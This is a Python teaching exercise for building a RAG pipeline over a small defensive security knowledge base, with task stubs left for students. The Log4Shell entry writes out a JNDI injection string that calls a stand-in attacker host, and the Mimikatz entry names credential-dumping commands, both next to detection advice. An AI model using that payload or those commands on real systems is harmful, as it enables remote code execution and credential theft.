# =============================================================================
# LESSON 4.4 | WORKSHOP | Exercise 3 of 3
# The Full RAG Pipeline
# =============================================================================
# WHAT YOU WILL LEARN
# -------------------
# - How to combine retrieval + augmentation + generation into a complete pipeline
# - How retrieved context is injected into the LLM prompt
# - How RAG prevents hallucination by grounding answers in real documents
#
# RUN THIS FILE
# -------------
#   python module4_genai/lesson4_rag/workshop/exercise3_rag_pipeline.py
#
# REQUIRES: sentence-transformers + one API key
#   set ANTHROPIC_API_KEY=...   (Claude — recommended)
#   set OPENAI_API_KEY=...
#   set GOOGLE_API_KEY=...
# =============================================================================

import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from llm_client import get_client

# --- Load embedding model ---
embed_model = SentenceTransformer("all-MiniLM-L6-v2")

# --- Load LLM client ---
provider, llm_client = get_client()
if llm_client is None:
    print("No API key found. Set ANTHROPIC_API_KEY, OPENAI_API_KEY, or GOOGLE_API_KEY.")
    print("(Exercises 1 and 2 still work without an API key.)")

print(f"Embedding model: all-MiniLM-L6-v2")
if llm_client:
    print(f"LLM provider: {provider}")

# Security knowledge base (same as Exercise 2)
KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
Unexpected access to lsass.exe from procdump, taskmgr, or unsigned binaries triggers high alerts.
Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged field.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1. Detection: outbound LDAP, jndi patterns in web logs.
""",
    "ransomware": """
Ransomware incident response phases:
Phase 1 (0-30 min): confirm indicators, find Patient Zero, do NOT reboot.
Phase 2: isolate via VLAN, disable accounts, block C2.
Phase 3: remove persistence, reset credentials, patch initial access vector.
Phase 4: restore from clean backups, monitor for re-infection.
""",
    "lateral_movement": """
Lateral movement detection: SMB anomalies (Event 4624 type 3), unusual RDP, PsExec/WMI execution.
Pass-the-Hash reuses NTLM hashes. Baseline admin behaviour to detect anomalies.
Alert when admin tools appear on non-admin workstations.
""",
    "phishing": """
Identify phishing by checking SPF/DKIM/DMARC, sender domain age, and URL redirect chains.
Hash attachments and check VirusTotal. Sandbox unknown executables.
Spear-phishing uses OSINT; BEC uses lookalike domains and urgency.
""",
    "network_segmentation": """
Segment: DMZ for internet-facing services, separate VLAN for OT/ICS, isolated network for DCs.
Zero-trust: verify every request, assume breach. Microsegmentation limits east-west traffic.
Document all segment boundaries and authorised communication paths.
""",
}

QUESTIONS = [
    "What Sysmon event ID should I monitor for credential dumping attacks?",
    "What are the first steps when ransomware is detected in my environment?",
    "How can I prevent lateral movement between network segments?",
]

# --- Helper: build index (same as Exercise 2) ---
def build_index(kb):
    all_chunks = []
    for doc_id, text in kb.items():
        words = text.split()
        step = 50
        for i in range(0, len(words), step):
            chunk = " ".join(words[i:i + 60])
            if len(chunk.split()) >= 10:
                all_chunks.append((doc_id, chunk))
    texts = [c[1] for c in all_chunks]
    idx = embed_model.encode(texts)
    return all_chunks, idx

def retrieve(query, all_chunks, index, top_k=3):
    q = embed_model.encode([query])
    sims = cosine_similarity(q, index)[0]
    top = np.argsort(sims)[::-1][:top_k]
    return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top]

# Build the index
all_chunks, index = build_index(KNOWLEDGE_BASE)
print(f"Index built: {len(all_chunks)} chunks from {len(KNOWLEDGE_BASE)} documents\n")

# =============================================================================
# BACKGROUND
# =============================================================================
# RAG pipeline:
#   1. Retrieve: find the top-k most relevant chunks for the query
#   2. Augment:  inject those chunks as context into the system prompt
#   3. Generate: call the LLM with the augmented prompt + user question
#
# The LLM answers using ONLY the retrieved context — not its general training.
# This prevents hallucination and makes answers auditable.

# =============================================================================
# TASK 1 — Build the augmented system prompt
# =============================================================================
# Write: build_rag_prompt(query, top_k=3) -> str
#   1. Retrieve top_k chunks using retrieve()
#   2. Format as:
#      context = "\n\n".join([f"[Source: {doc_id}]\n{chunk}" for score, doc_id, chunk in results])
#   3. Return this system prompt string:
#      "You are a security analyst assistant.
#       Answer the user's question using ONLY the information in the context below.
#       If the answer is not in the context, say 'I don't have that information in my knowledge base.'
#       Always cite which [Source: ...] you used.
#
#       CONTEXT:
#       {context}"
#
# Call build_rag_prompt(QUESTIONS[0]) and print the full prompt.
# Verify the relevant chunks appear in the context section.

# >>> YOUR CODE HERE


# =============================================================================
# TASK 2 — Full RAG call (requires API key)
# =============================================================================
# If llm_client is None, print a message and skip this task.
#
# For QUESTIONS[0]:
#   A) Pure LLM call (no context):
#      response_pure = llm_client.chat(
#          system="You are a security analyst assistant.",
#          messages=[{"role": "user", "content": QUESTIONS[0]}],
#          max_tokens=200,
#      )
#
#   B) RAG call (with context):
#      rag_system = build_rag_prompt(QUESTIONS[0])
#      response_rag = llm_client.chat(
#          system=rag_system,
#          messages=[{"role": "user", "content": QUESTIONS[0]}],
#          max_tokens=200,
#      )
#
# Print both responses with clear headers.
# Note: the RAG response should mention "Sysmon Event ID 10" specifically
#       because that information is in the knowledge base.

# >>> YOUR CODE HERE


# =============================================================================
# TASK 3 — 3-question Q&A session
# =============================================================================
# For each question in QUESTIONS (skip if no llm_client):
#   1. Retrieve top-3 chunks
#   2. Print the question
#   3. Print retrieved sources: "  Retrieved: [doc_id] (score), [doc_id] (score), ..."
#   4. Get RAG answer
#   5. Print the answer
#
# EXPECTED OUTPUT (approximate):
#   Q: What Sysmon event ID should I monitor for credential dumping attacks?
#   Retrieved: mimikatz (0.89), lateral_movement (0.65), mimikatz (0.61)
#   A: According to the Mimikatz documentation, you should monitor Sysmon Event ID 10...

# >>> YOUR CODE HERE


# =============================================================================
# TASK 4 — Out-of-scope question (BONUS)
# =============================================================================
# Ask this question (NOT covered in the knowledge base):
OUT_OF_SCOPE = "What is the best antivirus software to buy in 2024?"
#
# Run through the full RAG pipeline.
# Print the retrieved chunks and the LLM's answer.
# A well-behaved RAG system should say something like
# "I don't have that information in my knowledge base"
# rather than hallucinating a product recommendation.

# >>> YOUR CODE HERE


print("\n--- Exercise 3 complete. RAG workshop finished! ---")
print("--- Open reference_solution.py to compare your implementation. ---")
